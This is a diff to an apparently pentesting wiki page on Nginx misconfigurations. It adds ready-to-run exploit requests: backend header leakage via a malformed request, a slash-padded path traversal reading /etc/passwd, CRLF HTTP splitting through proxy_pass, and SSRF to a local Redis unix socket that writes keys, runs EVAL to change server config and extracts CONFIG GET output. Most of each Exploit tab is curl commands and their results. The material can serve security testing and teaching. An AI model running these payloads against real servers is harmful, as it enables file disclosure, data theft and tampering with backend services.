@@ -34,7 +34,7 @@ python3 nginxpwner.py https://example.com /tmp/pathlist
 {% endtab %}
 {% endtabs %}
 
-### Missing root location
+### Missing Root Location
 
 {% tabs %}
 {% tab title="Enumeration" %}
@@ -92,7 +92,7 @@ curl http://example.com/api/../../secrets.txt
 {% endtab %}
 {% endtabs %}
 
-### Unsafe variable use
+### Unsafe Variable Use
 
 {% tabs %}
 {% tab title="Enumeration" %}
@@ -129,18 +129,180 @@ learn more about CRLF and TTP response splitting [here](https://blog.detectify.c
 {% endtab %}
 {% endtabs %}
 
-### Raw backend response reading
+### Raw Backend Response Reading
 
 {% tabs %}
 {% tab title="Enumeration" %}
-enum...
+In Nginx, `proxy_pass` you can intercept errors and HTTP headers created by the backend. This is very useful if you want to hide internal error messages. But if client sends an invalid HTTP request, it will be forwarded as-is to the backend, the backend will answer with its raw content, and then Nginx won’t understand the invalid HTTP response and just forward it to the client.  
+
+With a configuration such as the following:
+```
+http {
+   error_page 500 /html/error.html;
+   proxy_intercept_errors on;
+   proxy_hide_header Secret-Header;
+}
+```
+[proxy_intercept_errors](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors) will serve a custom response if the backend has a response status greater than 300. In our uWSGI application above, we will send a 500 Error which would be intercepted by Nginx.
+[proxy_hide_header](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header) is pretty much self explanatory; it will hide any specified HTTP header from the client. 
 {% endtab %}
 {% tab title="Exploit" %}
-Because of this missconfiguration in the previous example....
+Because of this missconfiguration in the previous example, if we send an invalid HTTP request, we can leak informations from the backend
+```bash
+#Send invalid HTTP request
+GET /? XTTP/1.1
+Host: 127.0.0.1
+Connection: close
+
+#Respons with leaked informations
+XTTP/1.1 500 Error
+Content-Type: text/html
+Secret-Header: secret-info
+
+Secret info, should not be visible!
+```
+{% endtab %}
+{% endtabs %}
+
+### Merge_slashes Set To Off
+
+{% tabs %}
+{% tab title="Enumeration" %}
+The [merge_slashes](http://nginx.org/en/docs/http/ngx_http_core_module.html#merge_slashes) directive is set to `on` by default which is a mechanism to compress two or more forward slashes into one, so `///` would become `/`.
+If Nginx is used as a reverse-proxy and the application that’s being proxied is vulnerable to local file inclusion, using extra slashes in the request could leave room for exploit it. This is described in detail by [Danny Robinson and Rotem Bar](https://medium.com/appsflyerengineering/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d)
+
+{% endtab %}
+
+{% tab title="Exploit" %}
+Because of this missconfiguration, using multiple slashes `///` allow us to exploit that LFI vulnerability successfully.
+```bash
+curl "http://example.com//////../../../../../etc/passwd"
+```
+{% endtab %}
+{% endtabs %}
+
+### Proxy_pass Misconfigurations 
+
+The `proxy_pass` directive can be used to redirect internally requests to other servers internal or external.
+The use of this directive isn't a vulnerability but you should check how it's configured.
+
+#### HTTP Splitting
+
+{% tabs %}
+{% tab title="Enumeration" %}
+
+If the regular expressions used in that directive are weak, they allow **HTTP splitting** to happen.  
+
+With a configuration such as the following:
+```
+location ~ /docs/([^/]*/[^/]*)? {
+    proxy_pass https://bucket.s3.amazonaws.com/docs-website/$1.html;
+}
+```
+the problem with this regular expressions is that it also allows newlines per default. In this case, the `[^/]*` part actually also includes encoded newlines.
+{% endtab %}
+
+{% tab title="Exploit" %}
+Because of this missconfiguration, using multiple `%0d%0a` (CRLF) allow us to exploit that HTTP SPlitting vulnerability successfully. We can send the following request:
+```bash
+#Request
+curl 'http://example.com/docs/%20HTTP/1.1%0d%0aHost:non-existing-bucket1%0d%0a%0d%0a'
+
+#Request sent to bucket after proxy
+GET /docs-website/ HTTP/1.1
+Host:non-existing-bucket1
+
+.html HTTP/1.0
+Host: bucket.s3.amazonaws.com
+```
+{% endtab %}
+{% endtabs %}
+
+
+#### Controlling proxied host
+
+{% tabs %}
+{% tab title="Enumeration" %}
+In some setups, a matching path is used as part of the hostname to proxy to.
+```
+location ~ /static/(.*)/(.*) {
+    proxy_pass   http://$1-example.s3.amazonaws.com/$2;
+}
+```
+Since the bucket is attacker controlled (part of the URI path) this leads to XSS but also has further implications.  
+
+We could make `proxy_pass` connect to a local unix socket as it supports proxying requests to local `unix` sockets.
+What might be surprising is that the URI given to `proxy_pass` can be prefixed with `http://` or as a UNIX-domain socket path specified after the word `unix` and enclosed in colons:
+```
+proxy_pass http://unix:/tmp/backend.sock:/uri/;
+```
+{% endtab %}
+
+{% tab title="Exploit" %}
+Because of this missconfiguration, we can send a request to a local unix socket.
+```bash
+#Request
+curl 'http://example.com/static/unix:%2ftmp%2fsocket.sock:TEST/app-1555347823-min.js'
+
+#Request sent to /tmp/socket.sock after proxy
+GET TEST-example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
+Host: localhost
+Connection: close
+```
+
+For example, we can use it to make requests to a Redis socket and write any key:
+```bash
+#Request that set the key: "hacked" "isadmin" true
+curl -X HSET "http://example.com/static/unix:/var/run/redis/redis.sock:hacked%20isadmin%20true%20/random"
+
+#Request sent to /var/run/redis/redis.sock (Redis socket)
+HSET hacked "isadmin" "true" -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
+Host: localhost
+Connection: close
+```
+
+Also, we may abuse the [EVAL](https://redis.io/commands/eval/) Redis command to perform Arbitrary Redis command execution.
+We can execute Redis commands from EVAL using two different Lua functions: `redis.call()` and `redis.pcall()`
+```bash
+# Request to overwrite the maxclients config key:
+curl -X EVAL "http://example.com/static/unix:/var/run/redis/redis.sock:%22return%20redis.call('config','set','maxclients',1337)%22%200%20/app-1555347823-min.js" 
+
+#Request sent to /var/run/redis/redis.sock (Redis socket)
+EVAL "return redis.call('config','set','maxclients',1337)" 0 -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
+Host: localhost
+Connection: close
+```
+
+{% hint style="info" %}
+None of these commands respond with a valid HTTP response, and Nginx will not forward the output of the commands to the client, but instead a generic 502 Bad Gateway error.
+{% endhint %}
+
+Finaly, In order to **extract data**, we can avoid the `502` error by simply having the string `HTTP/1.0 200 OK` anywhere in the response using string concatenation in the Lua script.
+```bash
+#Request to extract response from the CONFIG GET * command
+curl -X EVAL 'http://example.com/static/unix:/var/run/redis/redis.sock:%27return%20(table.concat(redis.call("config","get","*"),"\n").."%20HTTP/1.1%20200%20OK\r\n\r\n")%27%200%20/app-1555347823-min.js'
+
+#Request sent to /var/run/redis/redis.sock (Redis socket)
+EVAL 'return (table.concat(redis.call("config","get","*"),"\n").." HTTP/1.1 200 OK\r\n\r\n")' 0 -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
+Host: localhost
+Connection: close
+
+
+#Request to extract response from the HGETALL key command
+curl -X EVAL 'http://example.com/static/unix:/var/run/redis/redis.sock:%27return%20(table.concat(redis.call("hgetall","key"),"\n").."%20HTTP/1.1%20200%20OK\r\n\r\n")%27%200%20/app-1555347823-min.js'
+
+#Request sent to /var/run/redis/redis.sock (Redis socket)
+EVAL 'return (table.concat(redis.call("hgetall","key"),"\n").." HTTP/1.1 200 OK\r\n\r\n")' 0 -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
+Host: localhost
+Connection: close
+```
+
 {% endtab %}
 {% endtabs %}
 
 ## Resources
 
 {% embed url="https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/" %}
+{% embed url="https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/" %}
 {% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx" %}
+
